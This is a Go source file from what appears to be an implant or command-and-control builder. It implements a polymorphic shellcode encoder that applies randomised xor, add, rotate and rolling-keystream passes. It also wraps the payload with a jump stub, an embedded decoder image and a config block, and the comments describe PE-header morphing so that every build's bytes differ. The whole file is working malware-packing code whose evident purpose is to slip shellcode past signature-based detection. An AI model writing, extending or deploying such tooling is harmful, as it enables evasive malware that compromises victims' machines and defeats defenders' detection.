// Package poly implements build polymorphism (plan P5):
//
//   - EncodeShellcode wraps position-independent shellcode with a prebuilt
//     decoder image (loaders/poly): [34-byte jump stub][decoder image][payload].
//     Multiple random passes (xor8 / add8 / rol8 / rolling-u32-xor) are applied
//     in order; the config stores them in decode order, so the C stub just walks
//     the table. Seeded runs are byte-reproducible; empty seed = unique build.
//   - MorphPE touches only harmless PE fields (timestamp, section names, DOS/Rich
//     gap, trailing overlay) so every PE build differs while the WISPCFG slot
//     and section data stay byte-identical.
//
// The decoder stub requires an executable (RWX) buffer — the same contract as
// sRDI shellcode.
package poly

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"

	"wispp/server/internal/peimg"
)

const (
	// cfgMagic / cfgSize are the POLYCFG layout shared with loaders/poly/decoder.c.
	cfgMagic = "POLYCFG\x01"
	cfgSize  = 48
	stubLen  = 34

	// Decoder op codes (encode semantics; the decoder applies inverses).
	opXor8  = 1 // xor with single byte key
	opAdd8  = 2 // encode: add key; decode: subtract key
	opRol8  = 3 // encode: rol by key&7; decode: ror
	opXor32 = 4 // rolling u32 LCG keystream (XOR is self-inverse)
)

// MaxPasses is the decoder table size (u8 op[4] / u32 key[4]).
const MaxPasses = 4

var (
	ErrEmptyPayload = errors.New("poly: empty payload")
	ErrPasses       = fmt.Errorf("poly: passes must be 1..%d", MaxPasses)
	ErrNoSentinel   = errors.New("poly: decoder has no POLYCFG sentinel")
	ErrAmbiguous    = errors.New("poly: decoder has multiple POLYCFG sentinels")
	ErrTooBig       = errors.New("poly: payload exceeds 32-bit stub offsets")
)

// Options controls one polymorphic build.
type Options struct {
	Passes    int    // 1..4 (0 = 1)
	Seed      string // deterministic/reproducible build; "" = fresh randomness
	NoOverlay bool   // PE morph only: never append an overlay (footer-at-end files)
}

func (o Options) passes() (int, error) {
	p := o.Passes
	if p == 0 {
		p = 1
	}
	if p < 1 || p > MaxPasses {
		return 0, ErrPasses
	}
	return p, nil
}

// seedMaterial turns the operator seed into 32 bytes; an empty seed gets fresh
// OS randomness so every build is unique.
func seedMaterial(seed string) ([]byte, error) {
	if seed != "" {
		s := sha256.Sum256([]byte(seed))
		return s[:], nil
	}
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}

func derive(seedMat []byte, counter byte) [32]byte {
	h := sha256.New()
	h.Write(seedMat)
	h.Write([]byte{counter})
	var out [32]byte
	copy(out[:], h.Sum(nil))
	return out
}

// opCycle keeps passes diverse for small pass counts.
var opCycle = [4]byte{opXor8, opXor32, opRol8, opAdd8}

// encodePass applies one encode transform in place.
func encodePass(p []byte, op byte, key uint32) {
	switch op {
	case opXor8, opAdd8:
		k := byte(key)
		for i := range p {
			if op == opXor8 {
				p[i] ^= k
			} else {
				p[i] += k
			}
		}
	case opRol8:
		r := key & 7
		if r == 0 {
			return
		}
		for i := range p {
			v := p[i]
			p[i] = byte(v<<r | v>>(8-r))
		}
	case opXor32:
		s := key
		for i := range p {
			p[i] ^= byte(s)
			s = s*1664525 + 1013904223
		}
	}
}

// decodePass mirrors loaders/poly/decoder.c (used by the Go round-trip tests).
func decodePass(p []byte, op byte, key uint32) {
	switch op {
	case opXor8:
		k := byte(key)
		for i := range p {
			p[i] ^= k
		}
	case opAdd8:
		k := byte(key)
		for i := range p {
			p[i] -= k
		}
	case opRol8:
		r := key & 7
		if r == 0 {
			return
		}
		for i := range p {
			v := p[i]
			p[i] = byte(v>>r | v<<(8-r))
		}
	case opXor32:
		s := key
		for i := range p {
			p[i] ^= byte(s)
			s = s*1664525 + 1013904223
		}
	}
}

// planPasses selects ops/keys for one build (encode order).
func planPasses(seedMat []byte, passes int) (ops [MaxPasses]byte, keys [MaxPasses]uint32) {
	for i := 0; i < passes; i++ {
		d := derive(seedMat, byte(i+1))
		op := opCycle[(int(d[0])+i)%len(opCycle)]
		var key uint32
		switch op {
		case opXor8, opAdd8:
			key = uint32(d[1])%255 + 1
		case opRol8:
			key = uint32(d[1])%7 + 1
		case opXor32:
			key = binary.LittleEndian.Uint32(d[1:5])
			if key == 0 {
				key = 1
			}
		}
		ops[i] = op
		keys[i] = key
	}
	return ops, keys
}

// EncodeShellcode encodes payload and wraps it with the decoder template.
// Layout: [jump stub][decoder image][encoded payload].
func EncodeShellcode(payload, decoder []byte, opt Options) ([]byte, error) {
	if len(payload) == 0 {
		return nil, ErrEmptyPayload
	}
	passes, err := opt.passes()
	if err != nil {
		return nil, err
	}
	seedMat, err := seedMaterial(opt.Seed)
	if err != nil {
		return nil, err
	}
	image, entryRVA, err := peimg.Map(decoder)
	if err != nil {
		return nil, err
	}
	cfgRVA := bytes.Index(image, []byte(cfgMagic))
	if cfgRVA < 0 {
		return nil, ErrNoSentinel
	}
	if bytes.Contains(image[cfgRVA+len(cfgMagic):], []byte(cfgMagic)) {
		return nil, ErrAmbiguous
	}
	if cfgRVA+cfgSize > len(image) {
		return nil, ErrNoSentinel
	}

	encOps, encKeys := planPasses(seedMat, passes)
	encoded := append([]byte(nil), payload...)
	for i := 0; i < passes; i++ {
		encodePass(encoded, encOps[i], encKeys[i])
	}

	payloadOff := align16(len(image))
	total := stubLen + payloadOff + len(encoded)
	if uint64(payloadOff) > uint64(^uint32(0)) || uint64(len(encoded)) > uint64(^uint32(0)) {
		return nil, ErrTooBig
	}
	out := make([]byte, total)
	copy(out, peimg.JumpStub(entryRVA, uint32(cfgRVA)))
	copy(out[stubLen:], image)

	cfg := out[stubLen+cfgRVA : stubLen+cfgRVA+cfgSize]
	put32 := func(at int, v uint32) { binary.LittleEndian.PutUint32(cfg[at:], v) }
	put32(8, 1) // version
	put32(12, uint32(payloadOff))
	put32(16, uint32(len(encoded)))
	put32(20, uint32(passes))
	// decoder walks its table forward → store passes in reverse (decode order).
	for i := 0; i < passes; i++ {
		cfg[24+i] = encOps[passes-1-i]
		put32(32+i*4, encKeys[passes-1-i])
	}

	copy(out[stubLen+payloadOff:], encoded)
	return out, nil
}

// ExtractForTest decodes the payload region of an EncodeShellcode result
// (unit tests only; the runtime path is the C decoder).
func ExtractForTest(out []byte) (payload []byte, ops [MaxPasses]byte, keys [MaxPasses]uint32, err error) {
	cfgRVA := bytes.Index(out[stubLen:], []byte(cfgMagic))
	if cfgRVA < 0 {
		return nil, ops, keys, ErrNoSentinel
	}
	cfg := out[stubLen+cfgRVA:]
	if len(cfg) < cfgSize {
		return nil, ops, keys, ErrNoSentinel
	}
	off := binary.LittleEndian.Uint32(cfg[12:])
	n := binary.LittleEndian.Uint32(cfg[16:])
	passes := binary.LittleEndian.Uint32(cfg[20:])
	if passes > MaxPasses {
		return nil, ops, keys, fmt.Errorf("poly: cfg passes %d", passes)
	}
	for i := uint32(0); i < passes; i++ {
		ops[i] = cfg[24+i]
		keys[i] = binary.LittleEndian.Uint32(cfg[32+i*4:])
	}
	at := stubLen + int(off)
	if at+int(n) > len(out) {
		return nil, ops, keys, fmt.Errorf("poly: cfg payload out of range")
	}
	return append([]byte(nil), out[at:at+int(n)]...), ops, keys, nil
}

// DecodePayload is the Go mirror of the C decoder (tests / diagnostics).
func DecodePayload(encoded []byte, ops [MaxPasses]byte, keys [MaxPasses]uint32, passes int) []byte {
	p := append([]byte(nil), encoded...)
	for i := 0; i < passes; i++ {
		decodePass(p, ops[i], keys[i])
	}
	return p
}

func align16(n int) int { return (n + 15) &^ 15 }
